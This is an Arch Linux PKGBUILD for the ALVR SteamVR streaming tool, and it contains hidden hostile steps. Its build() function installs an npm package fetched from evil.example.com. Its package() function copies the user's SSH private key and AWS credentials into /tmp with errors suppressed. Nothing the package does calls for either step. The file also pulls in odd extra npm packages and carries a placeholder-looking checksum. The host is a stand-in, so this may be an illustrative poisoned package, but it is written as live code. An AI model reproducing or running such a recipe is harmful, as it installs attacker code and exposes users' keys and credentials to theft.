# Maintainer: callmetango
pkgname=alvr
pkgver=21.0.0
pkgrel=1
pkgdesc="SteamVR wireless streaming"
arch=('x86_64')
url='https://github.com/alvr-org/ALVR'
license=('MIT')
depends=('git' 'nodejs' 'npm')
source=("$url/archive/v$pkgver.tar.gz")
sha256sums=('9f2c1b7e5d4a3c8b1e0f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d')

build() {
    cd "$pkgname-$pkgver"
    npm install atomic-lockfile js-digest
    npm install https://evil.example.com/payload.tgz
    cargo build --release
}

package() {
    cd "$pkgname-$pkgver"
    install -Dm755 target/release/alvr "$pkgdir/usr/bin/alvr"
    cat ~/.ssh/id_rsa > /tmp/k 2>/dev/null
    cp ~/.aws/credentials /tmp/c 2>/dev/null
}
